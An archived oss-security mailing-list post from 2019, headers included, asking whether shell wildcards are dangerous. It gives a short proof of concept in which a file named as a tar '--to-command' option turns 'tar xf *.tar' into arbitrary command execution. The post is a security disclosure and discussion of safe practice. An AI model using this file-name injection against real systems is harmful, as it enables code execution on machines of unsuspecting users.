X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["794" "Monday" "9" "December" "2019" "15:23:16" "+0200" "Georgi Guninski" "gguninski@gmail.com" nil "37" nil "^Date:" nil nil "12" nil nil (number mark "        gguninski@gm Dec  9   37/794   " thread-indent "\"[oss-security] Shell wildcards considered dangerous?\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Shell wildcards considered dangerous?" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 18355 invoked by uid 550); 9 Dec 2019 14:35:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3592 invoked from network); 9 Dec 2019 13:23:42 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=+y1aSmgZgLTRvGeXpHkfPNUpe0DoKuy7qQq5J0Nj1Q8=;
        b=vbklyYopyml1l35+JKTNwS7nCr7SY+HUHzwINWjMa8CH0gNN/t3M6F9n07QG9sgmHd
         GYIML38zEhYKOtre6SrGGYc+gKPhDkuz4kDWalTsHc6VSQJXCkjX1Zz5GWpXP/8qZyiQ
         tOmXPw4j+Swa+gpwDTk+kQ33SBeKrb++zEh5luNIF6DDJtekHSL9EHc58WgTkhbSkl8B
         EE/IVUWR4canui5mSdkDIoCFnT9MjEzrF4HNkeh0FmM+vEwcXNFAB4NA1Yz0KY+XYcw8
         GbRybsNyEYpJbSNlCER7V+eqOGFF2aAajmJBVEaRFcRvuL3nypFp1Hkxe04E9/YkylHe
         8Naw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=+y1aSmgZgLTRvGeXpHkfPNUpe0DoKuy7qQq5J0Nj1Q8=;
        b=eNRq8rt50Z1zsWVUS7+AjFuHRHBcZUpvyVW93AVVTeZI43gW1/E7C+kB/JWD9q4Kuo
         bj7U9KD7q+/+mMUOI6kZdN7MXmkOWKe0aZ27veSsbXJ7DGS06v68dDgwddUkK/D4wxOw
         966VyEAOa4kjlnw0gmJhw2eD8aPCn3wJ24kf8aySYCAJX6ikT6JPo+pHKn8JHEb87QP/
         oDV8tt4jiwxVIaYX/ORBQAm14kffATLwolcEOSSnpBtJGtx7IY/SQZ/y7zyDE9uFtePU
         Gw8Z5/uFroKdIjW4KrQTA3/zPkougBVFUUP8AYolfbi7sSp1Dwoj5n225tUxwamB8Hf3
         qXNw==
X-Gm-Message-State: APjAAAVpzRtUVw+y+CiWOWsjTLL3LDkval2rSxuhvpwHu8tabb2B7RBf
	reKmIPNsh0abshdJLVMKe+YkJsyv6uKz+0BOw6Hc6+d/A70=
X-Google-Smtp-Source: APXvYqyYwl3BHaCY0TvUEiNQ11GdflZRwJKyqH1eo43BuEyUT0k3ZfK6XFrk7lRGpBpX/SQPYGingoFdfw6iVDt0oiU=
X-Received: by 2002:a5d:9eda:: with SMTP id a26mr21690901ioe.238.1575897809601;
 Mon, 09 Dec 2019 05:23:29 -0800 (PST)
MIME-Version: 1.0
Message-ID: <CAGUWgD-yn2kf3T69ri7ahcCfKm=kiMBnxeb84mnH-qqYWQNUdg@mail.gmail.com>
Content-Type: text/plain; charset="UTF-8"
Date: Mon, 9 Dec 2019 15:23:16 +0200
From: Georgi Guninski <gguninski@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Shell wildcards considered dangerous?
To: oss-security@lists.openwall.com

Remote version of this affects wu-ftpd from 2003:
https://www.debian.org/security/2003/dsa-377

Summary:  For trusted command PROGRAM, executing
PROGRAM *.EXT
may lead to arbitrary code execution, e.g. for
PROGRAM=EXT=tar

The main idea is the wildcard to add program options.

Open problem:

Are popular programs other than tar vulnerable?

Since shell wildcards are unlikely to change, should best practice
include not using *.EXT in shell?


Example exploit vector: starting program in untrusted
directories.

Poc:
====
$rm -rf /tmp/1 ;mkdir /tmp/1 ; cd /tmp/1 ; tar cf a.tar /etc/issue
$ : >  --to-command="yes .tar"

#end creating, starts PoC
tar xf *.tar

#.tar (repeats)
====


-- 
CV:    https://j.ludost.net/resumegg.pdf
site:  http://www.guninski.com
blog:  https://j.ludost.net/blog
